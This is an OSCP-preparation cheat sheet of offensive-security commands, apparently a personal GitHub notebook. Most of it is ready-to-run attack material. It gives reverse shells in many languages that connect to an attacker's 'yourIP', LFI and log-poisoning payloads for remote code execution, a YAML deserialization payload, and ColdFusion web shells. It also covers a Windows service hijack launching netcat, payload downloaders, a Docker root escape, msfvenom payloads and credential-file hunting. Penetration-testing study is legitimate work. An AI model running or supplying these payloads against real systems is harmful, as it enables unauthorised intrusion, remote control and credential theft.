# redteam-notebook
Collection of commands, tips and tricks and references I found useful during preparation for OSCP exam.

## Early Enumeration - generic

### Network wide scan - first steps
`nmap -sn 10.11.1.0/24`

### netbios scan
`nbtscan -r 10.11.1.0/24`

### DNS recon
`dnsrecon -r 10.11.1.0/24 -n <DNS IP>`
  
### Scan specific target with nmap
`nmap -sV -sT -p- <target IP> `
  
### Guess OS using xprobe2
`xprobe2 <target IP>`

### Check Netbios vulns
`nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 target`

### Search for SMB vulns
`nmap -p139,445 <target IP> --script smb-vuln*`
  
### Enumerate using SMB (null session)
`enum4linux -a <target IP>`
  
### Enumerate using SMB (w/user & pass)
`enum4linux -a -u <user> -p <passwd> <targetIP>`

## Website Enumeration

### quick enumeration using wordlist
`gobuster -u http://<target IP> -w /usr/share/dirb/wordlists/big.txt`
  
### enumeration and basic vuln scan of a website
`nikto -host http://<target IP>`
  
## Website tips and tricks

### Python

* Unsafe YAML parsing may allow creation of Python objects and as a result remote code execution

```
!!python/object/apply:os.system ["bash -i >& /dev/tcp/yourIP/4444 0>&1"]
```

### PHP

* Check for LFI

Add `/etc/passwd%00` to any GET/POST arguments. On windows try `C:\Windows\System32\drivers\etc\hosts%00` or `C:\autoexec.bat%00`.
A quick win could also be any of these files `c:\sysprep.inf`, `c:\sysprep\sysprep.xml` or `c:\unattend.xml` as they would contain local admin credentials. On linux it's worth checking `/proc/self/environ` to see if there are any credentials passed to the running process via env vars.

* Fetching .php files via LFI

`/index.php?somevar=php://filter/read=convert.base64-encode/resource=<file path>%00` this will return base64 encoded PHP file. Good for fishing up `config.php` or similar.

* Abusing /proc/self/environ LFI to gain reverse shell
In some situations it's possible to abuse `/proc/self/environ` to execute a command. For example:
`index.php?somevar=/proc/self/environ&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

* Apache access.log + LFI = PHP injection
If Apache logs can be accessed via LFI it may be possible to use it to our advantage by injecting any PHP code in it and then viewing it via LFI.

with netcat send a request like this:
```
GET /<?php system($_GET["cmd"]);?>

```

* auth.log + LFI     
`ssh <?php system($_GET["cmd"]);?>@targetIP` and then LFI `/var/log/auth.log`

* /var/mail + LFI     
`mail -s "<?php system($_GET["cmd"]);?>" someuser@targetIP < /dev/null` 

* php expect     
`index.php?somevar=expect://ls`

* php input     
`curl -X POST "targetIP/index.php?somevar=php://input" --data '<?php system("curl -o cmd.php yourIP/cmd.txt");?>'`
Then access `targetIP/cmd.php`

### ColdFusion


* is it Enterprise or Community?     
Check how it handles `.jsp` files  `curl targetIP/blah/blah.jsp`. If 404 - enterprise, 500 - community.

* which version?     
`/CFIDE/adminapi/base.cfc?wsdl` has a useful comment indicating exact version

* common XEE     
https://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf

* LFI in admin login locale     
`/CFIDE/administrator/enter.cfm?locale=../../../../ColdFusion9\lib\password.properties` - may need full path. They can be obtained with help of  `/CFIDE/componentutils/cfexplorer.cfc`

* Local upload and execution     
Once access to admin panel is gained it's possible to use the task scheduler to download a file and use a system probe to execute it.

`Debugging & Logging` -> `Scheduled Tasks` -> url=<path to our executable>, Publish - save output to file (some writable path). Then manually execute this task which will download and save our file.
  
To execute it create a probe `Debugging & Logging` -> `System probes` -> URL=<some URL>, Probe fail - fail if probe does not contain "blahblah", Execute program <path to our downloaded exe>. And then run probe manually.
  
* Files worth grabbing     
  * CF7 \lib\neo-query.xml
  * CF8 \lib\neo-datasource.xml
  * CF9 \lib\neo-datasource.xml

* Simple remote CFM shell     
```
<html>
<body>
<cfexecute name = "#URL.runme#" arguments =
"#URL.args#" timeout = "20">
</cfexecute>
</body>
</html>
```

* Simple remote shell using Java (if CFEXECUTE is disabled)     
```
<cfset runtime = createObject("java",
"java.lang.System")>
<cfset props = runtime.getProperties()>
<cfdump var="#props#">
<cfset env = runtime.getenv()>
<cfdump var="#env#">
```

### dir busting

* generic dirbusting
`gobuster -u targetIP -w /usr/share/dirb/wordlists/big.txt`

* fuzz some cgi
`gobuster -u targetIP -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s 200`

## Reverse Shell Howto

* Bash     
`bash -i >& /dev/tcp/yourIP/4444 0>&1`

* Perl Linux     
`perl -e 'use Socket;$i="yourIP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

* Perl Windows     
`perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"yourIP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`


* Python     
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("yourIP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

* PHP     
`php -r '$sock=fsockopen("yourIP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`

* Ruby     
`ruby -rsocket -e'f=TCPSocket.open("yourIP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

* Java (Linux)     
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/yourIP/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

* Groovy
```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());
so.flush();po.flush();
Thread.sleep(50);
try {p.exitValue();
break;
}catch (Exception e){}};
p.destroy();
s.close();

```

* xterm

`xterm -display yourIP:1`

And on your side authorize the connection with `xhost +targetIp` and catch it with `Xnest :1`

* socat

Listener:
```socat file:`tty`,raw,echo=0 yourIP:4444```

target:
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:yourIP:4444`

## Interactive Shell Upgrade Tricks

* Python (Linux)     
`python -c 'import pty; pty.spawn("/bin/bash")' `

* Python (Windows)     
`c:\python26\python.exe -c 'import pty; pty.spawn("c:\\windows\\system32\\cmd.exe")' `

* Expect

sh.exp
```
#!/usr/bin/expect
spawn sh
interact
```

* Script    
`script /dev/null`


## Inside Windows

* Get version     
`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

* Get users     
`net users`

* Get user info     
`net user <username>`


* Check local connections and listening ports (compare with nmap scan to see if there are any hidden ports)     
`netstat -ano`

* Firewall status     
`netsh firewall show state`    
`netsh firewall show config`

* Scheduled tasks     
List - `schtasks /query /fo LIST /v`    
Create - `schtasks /Create /TN mytask /SC MINUTE /MO 1 /TR "mycommands"`     
Run - `schtasks /Run /TN mytask`    
Delete - `schtasks /Delete /TN mytask`    

* Running tasks     
List - `tasklist /SVC`    
Kill - `taskkill /IM <exe name> /F`    
Kill - `taskkill /PID <pid> /F`     

* Services     
List - `net start`     
Long name to key name `sc getkeyname "long name"`     
Details - `sc qc <key name>`     
Config - `sc config <key name> `    

* Low hanging fruits to grab     
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```

* Installers are running as elevated?     
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`    
`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`    

* Find interesting files     
`dir /s *pass* == *cred* == *vnc* == *.config*`     
`findstr /si password *.xml *.ini *.txt`     

* Find interesting registry entries     
`reg query HKLM /f password /t REG_SZ /s`     
`reg query HKCU /f password /t REG_SZ /s`     

* Permissions     
Check detail on service - `accesschk.exe /accepteula -ucqv <service name>`     
Find modifiable services - `accesschk.exe /accepteula -uwcqv "Authenticated Users" *`     
                           `accesschk.exe /accepteula -uwcqv "Users" *`     
Folder permissions - `accesschk.exe -dqv <path>`          
`cacls <path>`     
`icacls <path\file`     
                           
* Qick win on WinXP SP0/1       
`sc config upnphost binpath= "C:\nc.exe -nv yourIP 4444 -e C:\WINDOWS\System32\cmd.exe"`     
`sc config upnphost obj= ".\LocalSystem" password= ""`     
`sc config upnphost depend= ""`     
`net stop upnphost`     
`net start upnphost`     

* Quick wins     
`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`     
`reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"`     
`reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"`     
`reg query "HKCU\Software\ORL\WinVNC3\Password"`     

* Download file with VBS     
```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://yourIp/nc.exe", False
xHttp.Send

with bStrm
    .type = 1 \'//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\\Users\\Public\\nc.exe", 2 \'//overwrite
end with
```

* Download with Powershell 3+     
`powershell -NoLogo -Command "Invoke-WebRequest -Uri 'https://yourIP/nc.exe' -OutFile 'c:\Users\Public\Downloads\nc.exe'"`

* Download with Powershell 2     
`powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('https://yourIP/nc.exe', 'c:\Users\Public\Download\nc.exe')"`

* Download with Python     
`c:\Python26\python.exe -c "import urllib; a=open('nc.exe', 'wb'); a.write(urllib.urlopen('http://yourIP/nc.exe').read()); a.flush();a.close()" ` 


* Windows specific LPE vulns     
- https://www.exploit-db.com/exploits/11199/
- https://www.exploit-db.com/exploits/18176/
- https://www.exploit-db.com/exploits/15609/
- https://www.securityfocus.com/bid/42269/exploit
- https://www.securityfocus.com/bid/46136/exploit

## Inside Linux

* Basic enumeration

System info    
`uname -a`     

Arch     
`uname -m`     

Kernel    
`cat /proc/version	`     

Distro     
`cat /etc/*-release` or `cat /etc/issue`     

Filesystem    
`df -a	`     

Users     
`cat /etc/passwd`     

Groups     
`cat /etc/group`     

Super accounts     
`grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'`     

Currently logged in     
`finger`, `w`, `who -a`, `pinky`, `users`     

Last logged users     
`last`, `lastlog`     

Cheeky test -     
`sudo -l`     

Anything interesting we can run as sudo?     
`sudo -l 2>/dev/null | grep -w 'nmap|perl|awk|find|bash|sh|man|more|less|vi|vim|nc|netcat|python|ruby|lua|irb' | xargs -r ls -la 2>/dev/null`     

History -     
`history`     

Env vars     
`env`     

Available shells     
`cat /etc/shells	`     
     
SUID files     
`find / -perm -4000 -type f 2>/dev/null`     

SUID owned by root     
`find / -uid 0 -perm -4000 -type f 2>/dev/null`     

GUID files     
`find / -perm -2000 -type f 2>/dev/null	`     

World writable     
`find / -perm -2 -type f 2>/dev/null`     

World writable executed     
`find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null	`     

World writable dirs     
`find / -perm -2 -type d 2>/dev/null`     

rhost files     
`find /home –name *.rhosts -print 2>/dev/null	`     

Plan files     
`find /home -iname *.plan -exec ls -la {} ; -exec cat {} 2>/dev/null ;	`     

hosts.equiv     
`find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null ; -exec cat {} 2>/dev/null ;	`     

Can we peek at /root?     
`ls -ahlR /root/	`     

Find ssh files     
`find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" 2>/dev/null |xargs -r ls -la`     

Inetd     
`ls -la /usr/sbin/in.*	`     

Grep logs for loot     
`grep -l -i pass /var/log/*.log 2>/dev/null	`     

What do we have in logs     
`find /var/log -type f -exec ls -la {} ; 2>/dev/null	`     

Find conf files in /etc     
`find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} ; 2>/dev/null	`     

as above     
`ls -la /etc/*.conf	`     

List open files     
`lsof -i -n	`     

Can we read root mail?     
`head /var/mail/root	`     

What is running as root?     
`ps aux | grep root	`     

Lookup paths to running files     
`ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'`     

Exports and permissions of NFS     
`ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null	`     

List sched jobs     
`ls -la /etc/cron*	`     

List open connections (run with sudo/as root for more results)     
`lsof -i` 

Installed pkgs:
`dpkg -l` (debian), `rpm -qa` (RH)     

sudo version?      
`sudo -V`     

Available compilers      
`dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null`     


### Docker tips
Since most likely Docker runs as root if you can execute docker commands as unpriviledged user you can very likely use Docker's privs instead.

`docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash` - note that the root folder from host is mounted as `/host`. You'll also see all processes running on host and be connected to same NICs.

You may want to look into escaping UTS and IPC namespacing with `--uts=host --ipc=host`

### Upload files using cUrl with WebDAV
```
curl -T nc.exe http://targetIP/nc.txt
curl -X MOVE -v -H "Destination:http://targetIP/nc.exe" http://targetIP/nc.txt
```

## msfvenom

### List payloads
msfvenom -l

### Binaries

* Linux     
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`

* Windows     
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`

* Mac     
`msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho`

### Web Payloads

* PHP     
`msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
`cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`

* ASP     
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`

* JSP     
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`

* WAR     
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`

### Scripting Payloads

* Python     
`msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py`

* Bash     
`msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`

* Perl     
`msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`

### Shellcode
For all shellcode see `msfvenom –help-formats` for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

* Linux Based Shellcode     
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`

* Windows Based Shellcode     
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`

* Mac Based Shellcode     
`msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`

## Shellshock

* CVE-2014-6271    
`env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id`

* CVE-2014-7169     
`env X='() { (a)=>\' bash -c "echo date"; cat echo`

* CVE-2014-7186    
`bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"`

* CVE-2014-7187
`(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash || echo "CVE-2014-7187 vulnerable, word_lineno"` 

* CVE-2014-6278
`env X='() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; }' bash -c :` 

## References
* [OSCP Exam Guide](https://support.offensive-security.com/#!oscp-exam-guide.md) - MUST read!
* [The Magic of Learning](http://bitvijays.github.io/) - a real treasure trove!
* [FuzzySecurity](http://www.fuzzysecurity.com) - this is something you must bookmark... period. I found the [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html) especially useful.
* [WMIC reference/guide](https://www.computerhope.com/wmic.htm)
* [SysInternals](https://docs.microsoft.com/en-us/sysinternals/) - this is a must have for working on Windows boxes.
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
* [Elevating privileges by exploiting weak folder permissions](http://www.greyhathacker.net/?p=738)
* [ColdFusion for PenTesters](http://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf)
* [ColdFusion Path Traversal](http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/)
* [Penetration Testing Tools Cheat Sheet](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/) - Good read. Check out other cheat sheets on this page too!
* [fimap](https://github.com/kurobeats/fimap) - LFI/RFI scanner
* [Changeme](https://github.com/ztgrace/changeme) - default password scanner
* [CIRT Default Passwords DB](https://cirt.net/passwords)
* [From LFI to Shell](http://resources.infosecinstitute.com/local-file-inclusion-code-execution)
* [Useful Linux commands](https://highon.coffee/blog/linux-commands-cheat-sheet/)
* [Local Linux Enumeration](https://www.rebootuser.com/?p=1623)
* [Creating Metasploid Payloads](https://netsec.ws/?p=331)
* [Shellshock PoCs](https://github.com/mubix/shellshocker-pocs)

